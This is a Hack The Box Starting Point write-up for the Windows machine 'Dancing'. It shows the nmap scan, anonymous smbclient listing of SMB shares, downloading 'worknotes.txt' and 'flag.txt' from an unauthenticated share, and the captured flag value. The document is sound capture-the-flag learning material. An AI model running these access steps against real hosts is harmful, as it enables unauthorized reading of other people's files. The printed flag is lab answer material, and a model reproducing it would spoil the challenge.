# HTB - Starting Point - Dancing

🇧🇷 [Versão em Português](./README-dancing.pt-BR.md)

| Info         | Detail        |
|--------------|---------------|
| Platform     | Hack The Box  |
| Track        | Starting Point|
| Difficulty   | Very Easy     |
| OS           | Windows       |
| Status       | ✅ Completed  |

## Table of Contents
- [HTB - Starting Point - Dancing](#htb---starting-point---dancing)
  - [Table of Contents](#table-of-contents)
  - [Recon](#recon)
  - [Enumeration](#enumeration)
  - [Exploitation](#exploitation)
  - [Flag](#flag)
  - [Lessons Learned](#lessons-learned)

---

## Recon

I started the target machine through the HTB platform, which provided the target's IP address:

**Target IP:** `10.129.160.246`

I then connected to the Pwnbox (HTB's attack machine) and, through it, connected to the target's network via VPN.

I ran an **Nmap** scan to identify open ports and services on the target:

```bash
nmap 10.129.160.246
```

```
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5985/tcp open  wsman
```

The open ports (135, 139, 445) indicate this is a Windows host running **SMB** services, with port 5985 also suggesting WinRM is available.

---

## Enumeration

Since SMB (port 445) was open, I used `smbclient` to list the available shares on the target:

```bash
smbclient -L 10.129.160.246
```

When prompted for a password, I just pressed Enter (no credentials needed):

```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
```

Four shares were listed. `ADMIN$` and `C$` are default administrative shares, `IPC$` is used for inter-process communication, and `WorkShares` stood out as a custom share worth investigating.

I first tried accessing the administrative shares, but access was denied:

```bash
smbclient //10.129.160.246/ADMIN$
smbclient //10.129.160.246/C$
```

```
tree connect failed: NT_STATUS_ACCESS_DENIED
```

`IPC$` connected successfully but offered nothing of interest to browse.

---

## Exploitation

I then connected to the `WorkShares` share, which accepted the connection:

```bash
smbclient //10.129.160.246/WorkShares
```

```
smb: \> ls
  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021
```

Two user directories were present. I browsed into `Amy.J` first:

```bash
smb: \> cd Amy.J\
smb: \Amy.J\> ls
```

```
  worknotes.txt                       A       94  Fri Mar 26 07:00:37 2021
```

I downloaded the file found there:

```bash
smb: \Amy.J\> get worknotes.txt
```

I then went back and checked the second directory, `James.P`:

```bash
smb: \Amy.J\> cd ..
smb: \> cd James.P\
smb: \James.P\> ls
```

```
  flag.txt                            A       32  Mon Mar 29 05:26:57 2021
```

A `flag.txt` file was present. I downloaded it:

```bash
smb: \James.P\> get flag.txt
```

I closed the SMB session and read the file locally:

```bash
smb: \James.P\> exit
cat flag.txt
```

---

## Flag

```
5f61c10dffbc77a704d76016a22f1664
```

---

## Lessons Learned

- SMB shares can often be enumerated and accessed with null/anonymous sessions (no credentials, just pressing Enter when prompted for a password).
- Default administrative shares (`ADMIN$`, `C$`) are typically restricted, but custom shares (like `WorkShares` here) may be misconfigured to allow unauthenticated read access.
- Always browse every available share and subdirectory — files left in individual user folders (like `worknotes.txt` or `flag.txt`) are a common way to find sensitive information or loot.
- `smbclient`'s interactive shell behaves very similarly to FTP (`ls`, `cd`, `get`), making it straightforward to navigate once connected.
